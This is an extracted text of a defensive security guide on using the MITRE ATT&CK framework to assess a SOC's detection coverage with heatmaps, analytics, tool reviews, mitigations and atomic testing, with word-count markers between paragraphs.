[Word Count: 52]

GETTING STARTED WITH ATT&CK: Assessments and Engineering | Andy Applebaum
[Word Count: 10]

Once you’re familiar with this process—and have access to a bit more resources—you’ll 
ideally want to expand your analysis to span a reasonably large subset of the ATT&CK 
Matrix. Additionally, you’ll likely want to use a more advanced coverage scheme to now 
account for fidelity of detection as well. Here we like to recommend bucketing coverage 
into either low, some, or high confidence that a tool or analytic in our SOC will alert on 
the technique.
[Word Count: 76]

SAMPLE FOR WHAT A FINAL ASSESSMENT MIGHT LOOK LIKE
[Word Count: 9]

Tip: Don’t worry about pinpoint accuracy when trying to assess your coverage—your goal  
with assessments is to understand if you have the engineering capabilities to generally  
detect techniques. For more accuracy, we recommend running  adversary emulation  
exercises, as outlined in Chapter 3.
[Word Count: 42]

GETTING STARTED WITH ATT&CK: Assessments and Engineering | Andy Applebaum
[Word Count: 10]

This expanded scope makes analyzing analytics slightly more complex: each analytic now  
can potentially map to many different techniques, as opposed to just the one technique  
from before. Additionally, if you find an analytic that covers a particular technique, instead  
of just marking that the technique is covered, you’ll want to tease out that analytic’s  
coverage fidelity as well.
[Word Count: 59]

Tip: For each analytic, we recommend finding what it’s keying in on and seeing how that  
maps back to ATT&CK. As an example, you might have an analytic that looks at a specific  
Windows event; to determine this analytic’s coverage, you can look up the event ID in  
the Windows ATT&CK Logging Cheat Sheet or a similar repository. You can also use the  
ATT&CK website to analyze your analytics. The figure below shows an example of searching  
for detection of port 22, which shows up in the Commonly Used Port ATT&CK technique.
[Word Count: 92]

Another important aspect to consider are the Group and Software examples listed  
along with a technique. These describe the procedures, or specific ways, an adversary  
has used a technique. Oftentimes they represent variations of a technique that may or  
may not be covered by existing analytics and should also be factored into a confidence  
assessment in how well you cover a technique.
[Word Count: 62]

[Word Count: 10]

EXAMPLES SECTION OF WINDOWS ADMIN SHARES
[Word Count: 6]

In addition to looking at your analytics, you’ll also want to start analyzing your tools. To do 
this, we recommend iterating through each tool—creating a separate heatmap for each— 
and asking the following questions:
[Word Count: 34]

Square Where does the tool run? Depending on where a tool is running—e.g., at the perimeter 
or on each endpoint—it may do better or worse with specific tactics.
[Word Count: 28]

Square How does the tool detect? Is it using a static set of “known bad” indicators? Or is it 
doing something behavioral?
[Word Count: 22]

Square What data sources does the tool monitor? Knowing the data sources a tool monitors 
lets you infer which techniques it might detect.
[Word Count: 23]

Answering these questions can be hard. Not all vendors publish this kind of information,  
and oftentimes when you hunt for it, you’ll wind up finding marketing material. Try not to  
spend too much time getting bogged down with the specifics, opting instead for painting  
broad strokes about general coverage patterns.
[Word Count: 50]

To create a final heatmap of coverage, aggregate all of the heatmaps for your tools and 
analytics, recording the highest coverage over each technique.
[Word Count: 24]

GETTING STARTED WITH ATT&CK: Assessments and Engineering | Andy Applebaum
[Word Count: 10]

As a first step toward improving your coverage, we like to recommend a more advanced 
version of the analytic development process we mentioned earlier:
[Word Count: 24]

1. Create a list of high-priority techniques that you want to focus on in the short term.
[Word Count: 17]

2. Ensure you’re pulling in the right data to start writing analytics for the techniques 
you’re focusing on.
[Word Count: 18]

3. Start building analytics and updating your coverage chart.
[Word Count: 9]

START WITH YOUR CURRENT COVERAGE, ADD ANALYTICS, AND UPDATE YOUR COVERAGE ACCORDINGLY
[Word Count: 12]

You may also want to start upgrading your tools. As you’re analyzing documentation, keep 
track of any optional modules that you might be able to use to increase your coverage. 
If you come across any, look into what it would take to enable it on your network and 
balance this with the coverage it offers.
[Word Count: 55]

If you can’t find any additional modules for your tools, you can also try to use them as  
alternative data sources. As an example, you might not be able to install Sysmon on each  
of your endpoints, but your existing software might be able to forward relevant logs that  
you might not otherwise have access to.
[Word Count: 56]

Graduating to the next level: Once you start implementing some of these changes 
and improving your coverage, the next step is to introduce adversary emulation, and 
in particular, atomic testing. Each time you prototype a new analytic, run a matching 
atomic test and see if you caught it. If you did, great! If you didn’t, see what you missed, 
and refine your analytic accordingly. You can also check out our paper on Finding Cyber  
Threats with ATT&CK-based Analytics for more guidance on this process.
[Word Count: 84]

GETTING STARTED WITH ATT&CK: Assessments and Engineering | Andy Applebaum
[Word Count: 10]

For those with more advanced teams, a great way you can amp up your assessment is to 
include mitigations. This helps move your assessment away from just looking at tools and 
analytics and what they’re detecting to looking at your SOC as a whole.
[Word Count: 44]

A good way to identify how you’re mitigating techniques is to go through each of 
your SOC’s policies, preventative tools, and security controls, then map them to the 
ATT&CK technique(s) they may impact, and then add those techniques to your heatmap 
of coverage. Our recent restructuring of mitigations allows you to go through each 
mitigation and see the techniques it’s mapped to. Some examples of techniques with 
mitigations include:
[Word Count: 69]

Square Brute Force can be mitigated with account lockout policies.
[Word Count: 10]

Square Deploying Credential Guard on Windows 10 systems can make Credential Dumping
[Word Count: 12]

Square A hardened local administrator account can prevent Windows Admin Shares.
[Word Count: 11]

Square Leveraging Microsoft EMET’s Attack Surface Reduction rules can make it harder to 
use RunDLL32.
[Word Count: 15]

MITIGATIONS FOR BRUTE FORCE (LEFT) AND WINDOWS ADMIN SHARES (RIGHT)
[Word Count: 10]

Another way to extend your assessment is to interview—or informally chat with—others 
who work in your SOC. This can help you better understand how your tools are being 
used, as well as highlight gaps and strengths you might otherwise not consider.
[Word Count: 41]

Some example questions you might want to ask include:
[Word Count: 9]

Square What tools do you use most frequently? What are their strengths and weaknesses?
[Word Count: 14]

Square What data sources are you unable to see that you wish you could see?
[Word Count: 15]

Square Where are your biggest strengths and weaknesses from a detection perspective?
[Word Count: 12]

GETTING STARTED WITH ATT&CK: Assessments and Engineering | Andy Applebaum
[Word Count: 10]

Answers to these questions can help you augment the heatmaps you made earlier.
[Word Count: 13]

Example: If you previously found a tool that has a lot of ATT&CK-related capabilities, but  
personnel are only using it to monitor the Windows Registry, then you should modify that  
tool’s heatmap to better reflect how it’s being used.
[Word Count: 39]

As you talk to your colleagues, look at the tool heatmaps you had previously created. If  
you’re still not satisfied with the coverage your tools are providing, it may be necessary to  
evaluate new ones. Come up with a heatmap of coverage for each prospective new tool  
and see how adding it helps enhance your coverage.
[Word Count: 56]

Tip: If you’re particularly well-resourced, you can stand up a representative test  
environment to test the tool live, recording where it did well and where it didn’t do so well,  
and how adding it would impact your existing coverage.
[Word Count: 39]

Lastly, you may be able to decrease your reliance on tools and analytics by implementing  
more mitigations. Look at mitigations in ATT&CK to gauge if you can practically  
implement them. Consult your detection heatmap as part of this process; if there’s a  
high-cost mitigation that’ll prevent a technique that you’re doing a good job of detecting,  
it may not be a good trade-off.
[Word Count: 63]

On the other hand, if there are low-cost mitigations you can implement for techniques  
that you’re struggling to write analytics for, then implementing them might be a good use  
of resources.
[Word Count: 31]

Tip: Always weigh the potential loss of visibility when investigating removing detections  
in favor of mitigations. Make sure you have some visibility in cases where a mitigation  
or control may be bypassed so those events are less likely to be missed. Detection and  
mitigation should both be used as tools for effective coverage.
[Word Count: 53]

Assessing your defenses and guiding your engineering can be a great way to get started 
with ATT&CK. Running an assessment provides you with an understanding of where your 
current coverage is, which you can augment with threat intelligence to prioritize gaps, and 
then use to tune your existing defenses by writing analytics.
[Word Count: 52]

Long-term, you shouldn’t envision yourself as running an assessment every week, or even  
every month for that matter. Instead, you should keep a running tab on what your last  
assessment was, updating it every time you get new information, and periodically running  
adversary emulation exercises to spot-check your results.
[Word Count: 49]

Over time changes in the network and what’s collected may have unintended 
consequences that reduce the effectiveness of previously tested defenses. By leveraging 
ATT&CK to show how your defenses stack up to real threats, you’ll be able to better 
understand your defensive posture and prioritize your improvements.
